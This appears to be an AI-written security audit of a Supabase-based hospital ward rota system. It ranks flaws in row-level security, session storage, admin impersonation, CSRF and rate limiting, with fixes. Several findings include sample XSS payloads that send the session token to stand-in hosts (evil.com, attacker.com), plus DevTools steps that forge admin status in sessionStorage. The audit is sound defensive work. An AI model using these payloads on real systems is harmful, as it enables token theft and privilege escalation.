# COMPREHENSIVE SECURITY AUDIT REPORT
**Calpe Ward Rota Management System**  
**Date:** January 18, 2026  
**Status:** Critical Issues Identified - Requires Immediate Action  

---

## EXECUTIVE SUMMARY

This audit identified **12 critical to high-severity vulnerabilities** across the client and server layers. The primary attack vectors are:

1. **Client-side session trust** – Session tokens/PINs stored in localStorage/sessionStorage are trusted for authorization without server validation
2. **View-As impersonation without audit** – Admins can impersonate users and perform actions as them with no audit trail
3. **RLS policies using `auth.uid()` instead of tokens** – Policies depend on Supabase JWT `auth.uid()`, not your custom token system
4. **Overly permissive RLS** – Policies like `"public can read users"` and `"Anyone can read staffing requirements"` expose all staff data
5. **SECURITY DEFINER functions that accept client-provided IDs** – Client can specify `p_target_user_id` and functions trust it
6. **Missing PIN validation for admin actions** – Admin can perform sensitive operations without re-authenticating with PIN
7. **XSS risks in dynamic UI rendering** – Multiple innerHTML calls with user data (partially mitigated by `escapeHtml()`)
8. **Console logging of sensitive debug data** – User IDs, swap request details logged to console
9. **View-As banner can be bypassed** – sessionStorage manipulation allows privilege escalation
10. **No rate limiting on admin operations** – Brute force protection only on login, not on admin functions
11. **Token stored in sessionStorage** – Can be stolen via XSS or malicious browser extensions
12. **No CSRF protection on state-changing operations** – Admin functions lack CSRF tokens

---

## THREAT MODEL

### Attacker Profiles

**Profile A: Authenticated User (Non-Admin)**
- Can log in with valid username + PIN
- Goal: View/modify other users' data, escalate to admin
- Capabilities: Make API calls with valid session token, inspect localStorage/sessionStorage, modify window properties

**Profile B: Unauthenticated Attacker (Network/XSS)**
- Goal: Steal session tokens, impersonate admin, extract staff rotas
- Capabilities: Inject XSS, intercept sessionStorage, exploit View-As feature

**Profile C: Malicious Admin**
- Goal: Mass data exfiltration, privilege escalation, audit evasion
- Capabilities: Full access to admin panel, can impersonate any user, modify periods/assignments

---

## TOP 10 CRITICAL FINDINGS

| # | Severity | Title | Impact | Location | Exploit Scenario |
|---|----------|-------|--------|----------|------------------|
| **1** | 🔴 CRITICAL | RLS policies depend on `auth.uid()` not custom tokens | Entire auth system can be bypassed if JWT is forged/stolen | [sql/full_dump.sql](sql/full_dump.sql#L6642-L6806) | Attacker creates JWT with forged `auth.uid()`, passes RLS checks intended for token-auth model |
| **2** | 🔴 CRITICAL | View-As impersonation stores user in sessionStorage without audit | Admin can impersonate user and perform actions (shifts, requests, comments) as them with zero audit trail | [js/view-as.js](js/view-as.js#L156-L180) | Admin logs in, uses View-As to impersonate user, modifies their shifts, logs out. No record of who did it. |
| **3** | 🔴 CRITICAL | Admin operations don't require PIN re-authentication | Admin can delete periods, lock requests, execute swaps without proving they still have access | [js/admin.js](js/admin.js#L150-L300) | Admin leaves terminal unattended, attacker clicks "approve swap" or "delete notice" without PIN challenge |
| **4** | 🔴 CRITICAL | Client-provided `p_target_user_id` in admin RPCs is trusted server-side | SECURITY DEFINER function `admin_clear_request_cell(p_token, p_target_user_id, ...)` accepts user_id from client; function validates token but NOT that token belongs to an admin who should modify target_user_id | [sql/full_dump2.sql](sql/full_dump2.sql#L310-L323) | Non-admin user gets valid token, calls `admin_clear_request_cell` with `p_target_user_id` = anyone_else's_id; deletion succeeds if authorization check is weak |
| **5** | 🟠 HIGH | View-As feature can be bypassed by sessionStorage manipulation | Attacker modifies `VIEW_AS_STORAGE_KEY` to set `currentUser` to admin user | [js/view-as.js](js/view-as.js#L10-L170) | Attacker opens DevTools, sets `sessionStorage.setItem('calpeward.viewAs', JSON.stringify(adminUser))`, now functions see `currentUser.is_admin = true` |
| **6** | 🟠 HIGH | RLS policies are overly permissive; "public can read users", "anyone can read staffing" | Any authenticated user can query full staff rotas, usernames, IDs | [sql/full_dump.sql](sql/full_dump.sql#L6778, L6656) | User iterates through all user IDs and fetches staff data, creates internal map of who works when |
| **7** | 🟠 HIGH | Supabase anon key exposed in frontend code | Anon key is public by design, but combined with overly permissive RLS allows unauthorized data access | [js/config.js](js/config.js#L29-L33), [js/app.js](js/app.js#L4-L6) | Attacker uses exposed anon key + weak RLS to query staff database without login |
| **8** | 🟠 HIGH | Session token stored in sessionStorage (volatile, XSS-vulnerable) | XSS attack can steal token from sessionStorage | [js/session-validator.js](js/session-validator.js#L16), [login.html](login.html#L467) | Malicious JS on page: `fetch('attacker.com?token=' + sessionStorage.getItem('calpe_ward_token'))` |
| **9** | 🟠 HIGH | innerHTML used to render user-provided data (names, comments) | Partial mitigation via `escapeHtml()`, but inconsistent; some code paths may miss escaping | [js/view-as.js](js/view-as.js#L137), [js/admin.js](js/admin.js#L203-L446) | Attacker creates user with name `<img src=x onerror="fetch('attacker.com?token='+sessionStorage.getItem('calpe_ward_token'))">`, when admin views list, XSS fires |
| **10** | 🟠 HIGH | Admin PIN stored in sessionStorage indefinitely; no PIN re-challenge for sensitive ops | Admin PIN (`pinKey(currentUser.id)`) lives in sessionStorage until logout; used to verify admin identity but not re-checked | [js/shift-functions.js](js/shift-functions.js#L48), [js/admin.js](js/admin.js#L114) | Admin logs in, PIN stored. Attacker gains terminal access (physical or SSH), runs admin functions without re-entering PIN |

---

## DETAILED FINDINGS

### LAYER 1: DATABASE & RLS POLICIES

#### Finding 1.1: RLS Policies Use `auth.uid()` Not Custom Token System (CRITICAL)

**Location:** [sql/full_dump.sql](sql/full_dump.sql) lines 6642–6806  
**Severity:** 🔴 CRITICAL  
**Issue:**  
Your session validation system uses **custom tokens** (UUID-based, validated via `require_session_permissions()` RPC), but RLS policies still reference `auth.uid()`, which is the Supabase JWT's embedded user ID. This creates a fundamental mismatch:

```sql
-- Example from full_dump.sql line 6778
CREATE POLICY "public can read users" ON public.users 
FOR SELECT USING (true);

-- line 6656
CREATE POLICY "Anyone can read staffing requirements" ON public.staffing_requirements 
FOR SELECT TO authenticated USING (true);
```

Both policies allow **any authenticated user** to read all data regardless of token validation. The token system is bypassed for direct table queries.

**Attack Scenario:**
1. Non-admin user logs in normally, gets valid token
2. User directly queries `.from("users").select("*")` (not via RPC)
3. RLS sees `auth.uid() IS NOT NULL` → policy allows it
4. User reads all staff names, IDs, roles

**Impact:** IDOR vulnerability, information disclosure

---

#### Finding 1.2: Overly Permissive RLS Policies (HIGH)

**Location:** [sql/full_dump.sql](sql/full_dump.sql) lines 6642–6806  
**Severity:** 🟠 HIGH  
**Policies Affected:**
- `"public can read users"` – any authenticated user can SELECT * FROM users
- `"Anyone can read staffing requirements"` – any authenticated user can read all staffing
- `"public read request_cell_locks"` – any authenticated user can read locks on any user's requests
- `"public read requests"` – any authenticated user can read all requests

**Impact:** Lateral data exposure; non-admin users can enumerate staff schedules, identify high-workload periods, plan time-off collisions.

---

#### Finding 1.3: SECURITY DEFINER Functions Accept Client-Provided Target User IDs Without Validation (CRITICAL)

**Location:** [sql/full_dump2.sql](sql/full_dump2.sql) lines 310–323 (`admin_clear_request_cell`)  
**Severity:** 🔴 CRITICAL  
**Code:**
```sql
CREATE FUNCTION public.admin_clear_request_cell(p_token uuid, p_target_user_id uuid, p_date date)
    LANGUAGE plpgsql SECURITY DEFINER
    SET search_path TO 'public', 'pg_temp'
AS $$
DECLARE
  v_admin_uid uuid;
  v_is_admin boolean;
BEGIN
  v_admin_uid := public.require_session_permissions(p_token, null);
  SELECT is_admin INTO v_is_admin FROM public.users WHERE id = v_admin_uid;
  IF v_is_admin IS NULL OR NOT v_is_admin THEN
    PERFORM public.require_session_permissions(p_token, ARRAY['requests.edit_all']);
  END IF;
  DELETE FROM public.requests WHERE user_id = p_target_user_id AND date = p_date;
END;
$$;
```

**Issue:**  
The function validates the **caller's token** (line 310: `require_session_permissions`), but does not validate that the caller should have permission to modify `p_target_user_id`. If a non-admin user somehow gets a valid token, they can call this function and pass any UUID as `p_target_user_id`, and the DELETE will succeed if the DB permissions don't prevent it.

**Attack Scenario:**  
1. Non-admin user with permission group has token
2. User calls `admin_clear_request_cell(token, someone_else_uuid, 2026-01-20)`
3. Function checks: `require_session_permissions(token, ['requests.edit_all'])`
4. If user's permission group HAS `requests.edit_all`, permission check passes
5. DELETE FROM requests WHERE user_id = someone_else_uuid happens
6. Their requests are deleted

**Root Cause:** Authorization check does not bind `p_target_user_id` to the caller's scope. Should be:
- Admin: can delete any user's requests
- Non-admin with `requests.edit_all`: can only delete own requests

---

#### Finding 1.4: Missing Data Minimization in Admin RPCs (HIGH)

**Location:** [sql/full_dump2.sql](sql/full_dump2.sql) lines 766–796 (`admin_get_notice_acks`)  
**Severity:** 🟠 HIGH  
**Issue:**  
`admin_get_notice_acks` returns full JSONB objects with user details:
```sql
RETURNS TABLE(acked jsonb, pending jsonb)
```

Each entry likely contains `user_id, name, acked_at`, exposing user list even to admins who may not have `users.view` permission.

**Impact:** Unnecessary data leakage

---

### LAYER 2: FRONTEND & SESSION MANAGEMENT

#### Finding 2.1: Session Token Stored in sessionStorage (XSS Target) (HIGH)

**Location:** [js/session-validator.js](js/session-validator.js#L16), [login.html](login.html#L467)  
**Severity:** 🟠 HIGH  
**Code:**
```javascript
// session-validator.js line 16
const token = sessionStorage.getItem(TOKEN_KEY);

// login.html line 467
sessionStorage.setItem(TOKEN_KEY, row.token);
```

**Issue:**  
Session tokens are stored in `sessionStorage`, which is:
- **Accessible to any JavaScript** on the page (including XSS)
- **Not sent in HTTP headers** (unlike secure cookies), so can't use HttpOnly flag
- **Cleared when tab closes**, but stolen during session is enough

**Attack Scenario:**
1. Admin is logged in, token in sessionStorage
2. Attacker injects XSS: `<img src=x onerror="fetch('evil.com?t='+sessionStorage.getItem('calpe_ward_token'))">`
3. Token exfiltrated to attacker
4. Attacker calls admin RPCs with stolen token
5. All admin actions (delete notices, lock requests, etc.) executed as admin

**Mitigation:** Move to HttpOnly cookies + CSRF tokens, but Supabase doesn't support this directly. Next best: use Memory-only storage + re-validate on each page load.

---

#### Finding 2.2: View-As Feature Stores Impersonated User in sessionStorage Without Audit (CRITICAL)

**Location:** [js/view-as.js](js/view-as.js#L156–180), [js/admin.js](js/admin.js#L113–170)  
**Severity:** 🔴 CRITICAL  
**Code:**
```javascript
// view-as.js line 156
sessionStorage.setItem(REAL_USER_STORAGE_KEY, JSON.stringify(currentUser));

// view-as.js line 168
sessionStorage.setItem(VIEW_AS_STORAGE_KEY, JSON.stringify(user));

// view-as.js line 198
currentUser = user;  // Window.currentUser is now the impersonated user
```

**Issue:**
1. Admin uses "View As" to switch to a staff user
2. All subsequent RPC calls use `currentUser.id` (now the staff user's ID)
3. **No audit trail** – RPCs like `set_request_cell`, `upsert_week_comment` execute as the impersonated user
4. **Functions don't know they're being called by an impersonator**
5. Admin can modify staff assignments, lock their requests, delete comments as if the staff member did it

**Attack Scenario:**
1. Admin logs in
2. Admin clicks "View As John Smith"
3. Admin modifies John's shift request
4. John has no idea; audit log shows John modified his own shifts
5. HR investigates missing document: "John made the request"
6. Real perpetrator (admin) never identified

**Root Cause:** `currentUser.id` is sent directly to RPCs; functions don't have a "real_admin_id" or "impersonator_id" field to log.

**Fix Required:** 
- Add `p_real_user_id` parameter to sensitive RPCs
- Log impersonator identity in audit tables
- Block View-As from performing certain actions (request locks, period changes)

---

#### Finding 2.3: View-As Impersonation Can Be Spoofed via sessionStorage (HIGH)

**Location:** [js/view-as.js](js/view-as.js#L10–30)  
**Severity:** 🟠 HIGH  
**Code:**
```javascript
function getViewAsUser() {
  const stored = sessionStorage.getItem(VIEW_AS_STORAGE_KEY);
  if (stored) {
    try {
      return JSON.parse(stored);
    } catch (e) {
      return null;
    }
  }
  return null;
}

function checkViewAsOnLoad() {
  const viewAsUser = getViewAsUser();
  const realUser = getRealUser();
  if (viewAsUser && realUser) {
    currentUser = viewAsUser;  // Trusted blindly!
    showViewAsBanner();
  }
}
```

**Issue:**  
`currentUser` is set directly from sessionStorage without re-validating the user exists or that the real user is an admin. An attacker can:

1. Open DevTools console
2. `sessionStorage.setItem('calpeward.viewAs', JSON.stringify({id: admin_uuid, is_admin: true, name: "Admin"}))`
3. `sessionStorage.setItem('calpeward.realUser', JSON.stringify({id: attacker_uuid, is_admin: false, name: "Attacker"}))`
4. Reload page
5. `currentUser.is_admin = true` checks pass
6. All admin functions see `is_admin: true`

**Impact:** Privilege escalation from non-admin to admin

---

#### Finding 2.4: Admin PIN Not Re-Challenged for Sensitive Operations (HIGH)

**Location:** [js/shift-functions.js](js/shift-functions.js#L48), [js/admin.js](js/admin.js#L114)  
**Severity:** 🟠 HIGH  
**Code:**
```javascript
// shift-functions.js line 48
const pin = sessionStorage.getItem(`calpeward.pin.${currentUser.id}`);

// admin.js line 114
let pin = sessionStorage.getItem(pinKey(currentUser.id));
```

**Issue:**
- Admin logs in with PIN, PIN stored in sessionStorage
- For next X minutes, admin can delete periods, lock requests, execute swaps **without re-entering PIN**
- If admin leaves terminal unattended, attacker can perform admin operations

**Attack Scenario:**
1. Admin logs into admin panel with PIN
2. Admin steps away for 15 minutes
3. Attacker walks up to terminal, clicks "Approve Shift Swap"
4. Function checks for PIN in sessionStorage
5. PIN is there from earlier login
6. Swap approved as if admin did it
7. Attacker walks away; admin has no idea

**Mitigation:** Require PIN entry for operations like:
- Delete/deactivate period
- Lock request cell
- Approve/decline swap requests
- Delete notices

---

#### Finding 2.5: localStorage Used for User ID Persistence Without Server Validation (MEDIUM)

**Location:** [js/permissions.js](js/permissions.js#L17), [js/app.js](js/app.js#L75), [login.html](login.html#L469)  
**Severity:** 🟡 MEDIUM  
**Code:**
```javascript
// permissions.js line 17
const savedId = localStorage.getItem(STORAGE_KEY);

// login.html line 469
localStorage.setItem("calpeward.loggedInUserId", row.user_id);
```

**Issue:**
- User ID is stored in localStorage for persistence across tab reloads
- On page load, permissions module uses this ID to fetch permissions without validating token first
- If sessionStorage is cleared but localStorage isn't, stale user ID can be used

**Attack Scenario:**
1. Admin logs in
2. User closes tab but doesn't log out
3. Attacker opens the app in a new tab
4. Page loads, finds localStorage `calpeward.loggedInUserId` = admin's ID
5. Code tries to load admin's permissions before checking token
6. If permission check is skipped, attacker could see admin UI

**Current Mitigation:** `session-validator.js` does validate token on load, but this is a defense-in-depth gap.

---

#### Finding 2.6: Swap Functions Log Sensitive Debug Data to Console (MEDIUM)

**Location:** [js/swap-functions.js](js/swap-functions.js#L13–31), [js/admin.js](js/admin.js#L51–52)  
**Severity:** 🟡 MEDIUM  
**Code:**
```javascript
// swap-functions.js line 13–30
console.log("[SWAP] Calling admin_execute_shift_swap with:", {
  admin_id: window.currentUser.id,
  period_id: periodId,
  initiator_user_id: window.activeCell.userId,
  initiator_date: window.activeCell.date,
  counterparty_user_id: counterpartyUserId,
  counterparty_date: counterpartyDate
});

// swap-functions.js line 51–52
console.log("[SWAP DEBUG] User ID being sent:", window.currentUser.id);
console.log("[SWAP DEBUG] User ID type:", typeof window.currentUser.id);
```

**Issue:**  
User IDs and swap details are logged to browser console. An attacker with access to the terminal or browser history can see:
- Who is initiating swaps
- Who they're swapping with
- When and with whom the admin is logged in

**Impact:** Information disclosure, potential social engineering

---

#### Finding 2.7: innerHTML Used for Rendering User-Provided Data (MEDIUM)

**Location:** [js/view-as.js](js/view-as.js#L137, L260), [js/admin.js](js/admin.js#L203, L446)  
**Severity:** 🟡 MEDIUM  
**Code:**
```javascript
// view-as.js line 137
statusEl.innerHTML = `👁️ Viewing as <strong>${escapeHtml(viewAsUser.name)}</strong>...`;

// admin.js line 203
adminLoginUser.innerHTML = `<option value="">Select user...</option>${options}`;
```

**Issue:**  
While `escapeHtml()` is used for user names, there are multiple innerHTML assignments. If any code path misses escaping, XSS is possible.

**Attack:** Create user with name containing template syntax that bypasses escapeHtml:
```
" onclick="alert(sessionStorage.getItem('calpe_ward_token'))
```

---

### LAYER 3: AUTHORIZATION & PRIVILEGE ESCALATION

#### Finding 3.1: Admin Can Impersonate Any User Without Permission Check (CRITICAL)

**Location:** [js/view-as.js](js/view-as.js#L148–180)  
**Severity:** 🔴 CRITICAL  
**Code:**
```javascript
async function startViewingAs(userId) {
  if (!currentUser || !currentUser.is_admin) {
    alert("Only admins can use View As feature");
    return;
  }
  // ^ Only checks if user.is_admin = true
  // No server-side validation!
  
  const { data: user, error } = await supabaseClient
    .from("users")
    .select("id, name, role_id, is_admin, is_active, preferred_lang, display_order")
    .eq("id", userId)
    .single();
  
  sessionStorage.setItem(VIEW_AS_STORAGE_KEY, JSON.stringify(user));
  currentUser = user;
}
```

**Issue:**
- Check `currentUser.is_admin` is client-side only
- No server-side authorization RPC to validate admin can impersonate
- No audit trail of impersonation
- No restrictions on which users can be impersonated

**Impact:** Malicious admin can impersonate other admins, cover tracks, escalate privilege subtly.

**Root Cause:** No audit mechanism; all actions appear as the impersonated user.

---

#### Finding 3.2: Permission Groups Have No Scope Binding (HIGH)

**Location:** [js/admin.js](js/admin.js#L275–300), [sql/full_dump2.sql](sql/full_dump2.sql) permission checks  
**Severity:** 🟠 HIGH  
**Issue:**  
Permission like `requests.edit_all` is a flat permission key with no scoping. A user with `requests.edit_all` can edit **all** users' requests, not just their own or a subset.

**Better Model:**  
- `requests.edit_own`
- `requests.edit_department`
- `requests.edit_all`

---

### LAYER 4: RATE LIMITING & BRUTE FORCE

#### Finding 4.1: No Rate Limiting on Admin Operations (HIGH)

**Location:** [sql/full_dump2.sql](sql/full_dump2.sql) — no RATE LIMIT on admin RPC calls  
**Severity:** 🟠 HIGH  
**Issue:**  
Rate limiting is applied to `verify_login` (5 failed attempts → 15 min lockout), but NO rate limiting on:
- Admin swap approvals
- Admin period creates
- Admin request cell locks
- Notice deletions

**Attack Scenario:**  
1. Attacker gets admin token (or spoofs one)
2. Attacker mass-approves hundreds of swap requests to corrupt rota
3. No rate limiting, no throttling
4. Damage done before anyone notices

---

### LAYER 5: SECRETS & KEY EXPOSURE

#### Finding 5.1: Supabase Anon Key Exposed in Frontend (EXPECTED, But Verify RLS) (MEDIUM)

**Location:** [js/config.js](js/config.js#L29), [js/app.js](js/app.js#L4–6), [login.html](login.html#L354–355)  
**Severity:** 🟡 MEDIUM  
**Code:**
```javascript
const SUPABASE_ANON = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
window.SUPABASE_ANON = SUPABASE_ANON;
```

**Issue:**  
Anon key is visible in source. This is **by design** in Supabase, but relies on RLS policies to protect data. Combined with overly permissive RLS (Finding 1.2), this is exploitable.

**Attack:**
1. Attacker extracts anon key from page source
2. Attacker creates unauthenticated client: `supabase.createClient(URL, ANON_KEY)`
3. Attacker queries `.from("users").select("*")`
4. RLS policy checks `auth.uid() IS NOT NULL`
5. Since unauthenticated, `auth.uid() = NULL`, policy should deny
6. But overly permissive policy `"public can read users" USING (true)` allows it anyway

---

### LAYER 6: MISSING PROTECTIONS

#### Finding 6.1: No CSRF Protection on State-Changing Admin Operations (HIGH)

**Location:** All admin RPC calls in [js/admin.js](js/admin.js), [js/swap-functions.js](js/swap-functions.js)  
**Severity:** 🟠 HIGH  
**Issue:**  
Admin functions like "Approve Swap" make RPC calls directly with no CSRF token validation.

**Attack Scenario (if app is served from a domain an attacker controls):**
1. Admin is logged into `/admin.html` in one tab
2. Admin visits attacker's website in another tab
3. Attacker's site has hidden form: `<form action="https://calpeward.com/admin.html" method="POST">`
4. On form submit, JavaScript calls admin RPC with attacker-chosen parameters
5. Admin's token is in sessionStorage, request succeeds
6. Attacker has made admin approve swaps, delete periods, etc.

**Mitigation:** Add unique CSRF token per session, validate on each state-changing RPC.

---

#### Finding 6.2: No Audit Logging for Admin Operations (HIGH)

**Location:** No audit table referenced in [sql/full_dump2.sql](sql/full_dump2.sql)  
**Severity:** 🟠 HIGH  
**Issue:**  
None of the admin SECURITY DEFINER functions insert audit records. When admin deletes a notice or approves a swap, there's no log of WHO did it, WHEN, and FROM WHERE.

**Impact:** If something goes wrong (notice deleted accidentally, swap approved in error), no way to trace who did it or recover intent.

---

#### Finding 6.3: No Timestamp/TTL Validation on Session Tokens (MEDIUM)

**Location:** [sql/full_dump2.sql](sql/full_dump2.sql) — `validate_session` function  
**Severity:** 🟡 MEDIUM  
**Issue:**  
Tokens stored in `session_tokens` table. When checking validity, code likely only checks if token exists in table. If token is never explicitly expired (e.g., on logout), it remains valid indefinitely.

**Attack Scenario:**
1. User logs in, gets token
2. User logs out → token should be revoked
3. If revoke fails or is forgotten, token remains valid forever
4. Attacker who found token can use it indefinitely

---

---

## SUMMARY TABLE: ALL FINDINGS

| ID | Severity | Finding | File:Line | Fix Effort | Impact |
|---|---|---|---|---|---|
| 1.1 | 🔴 CRITICAL | RLS uses `auth.uid()` not custom tokens | sql/full_dump.sql:6642–6806 | HIGH | Complete RLS overhaul required |
| 1.2 | 🟠 HIGH | Overly permissive RLS policies | sql/full_dump.sql:6642–6806 | MEDIUM | Data exfiltration |
| 1.3 | 🔴 CRITICAL | SECURITY DEFINER functions trust client `p_target_user_id` | sql/full_dump2.sql:310–323 | MEDIUM | IDOR vulnerability |
| 1.4 | 🟠 HIGH | Missing data minimization in admin RPCs | sql/full_dump2.sql:766–796 | LOW | Info disclosure |
| 2.1 | 🟠 HIGH | Session token in sessionStorage (XSS target) | js/session-validator.js:16, login.html:467 | HIGH | Token theft |
| 2.2 | 🔴 CRITICAL | View-As impersonation without audit | js/view-as.js:156–180 | HIGH | Audit evasion |
| 2.3 | 🟠 HIGH | View-As can be spoofed via sessionStorage | js/view-as.js:10–30 | LOW | Privilege escalation |
| 2.4 | 🟠 HIGH | Admin PIN not re-challenged for sensitive ops | js/shift-functions.js:48, js/admin.js:114 | MEDIUM | Unattended terminal abuse |
| 2.5 | 🟡 MEDIUM | localStorage user ID without validation | js/permissions.js:17, js/app.js:75 | LOW | Stale session possible |
| 2.6 | 🟡 MEDIUM | Debug console logging of user IDs/swaps | js/swap-functions.js:13–31 | LOW | Info disclosure |
| 2.7 | 🟡 MEDIUM | innerHTML + user data (partial XSS mitigation) | js/view-as.js:137, js/admin.js:203 | LOW | XSS possible if escaping fails |
| 3.1 | 🔴 CRITICAL | Admin impersonation without server validation | js/view-as.js:148–180 | MEDIUM | Privilege escalation |
| 3.2 | 🟠 HIGH | Permission groups lack scope binding | js/admin.js:275–300 | MEDIUM | Over-privileged permissions |
| 4.1 | 🟠 HIGH | No rate limiting on admin operations | sql/full_dump2.sql (all admin RPCs) | MEDIUM | Brute force/DoS |
| 5.1 | 🟡 MEDIUM | Anon key exposed (OK if RLS is tight) | js/config.js:29, js/app.js:4–6 | LOW | Depends on RLS |
| 6.1 | 🟠 HIGH | No CSRF protection on admin operations | js/admin.js, js/swap-functions.js | MEDIUM | CSRF attacks |
| 6.2 | 🟠 HIGH | No audit logging for admin actions | sql/full_dump2.sql (all admin functions) | HIGH | Non-repudiation failure |
| 6.3 | 🟡 MEDIUM | No TTL/expiry validation on tokens | sql/full_dump2.sql (validate_session) | MEDIUM | Token persistence |

---

## NEXT STEPS

**When you run the SQL audit query**, I will:
1. Verify which tables have RLS enabled
2. Get exact RLS policy definitions
3. Check current token validation logic
4. Identify which RPCs are exposed to which roles (anon/authenticated)
5. Create targeted patches for each critical issue

**Please run the audit query** and share the results. I'll then generate:
- Exact SQL migration scripts to fix RLS
- JavaScript patches with line-by-line changes
- New audit table schema
- Updated authorization logic for admin functions

